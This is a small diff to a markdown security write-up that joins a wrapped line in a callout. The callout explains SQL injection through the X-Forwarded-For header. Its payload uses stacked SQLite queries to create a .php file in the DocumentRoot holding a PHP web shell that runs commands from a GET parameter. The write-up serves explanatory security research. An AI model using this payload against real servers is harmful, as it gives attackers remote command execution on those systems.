@@ -175,8 +175,7 @@ GET /api/user/******/workstation HTTP/1.1
 >[!bug]
 > It's important to note that we could also use sqlite to write a php file and obtain command execution. Consider for instance this payload (it needs stacked queries to work):
 > ```
-> X-Forwarded-For: ','xxx',1);ATTACH DATABASE './lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT
- INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");-- -
+> X-Forwarded-For: ','xxx',1);ATTACH DATABASE './lol.php' AS lol;CREATE TABLE lol.pwn (dataz text);INSERT INTO lol.pwn (dataz) VALUES ("<?php system($_GET['cmd']); ?>");-- -
 > ```
 > This will create a `lol.php` in the current directory which happens to be the DocumentRoot.
 
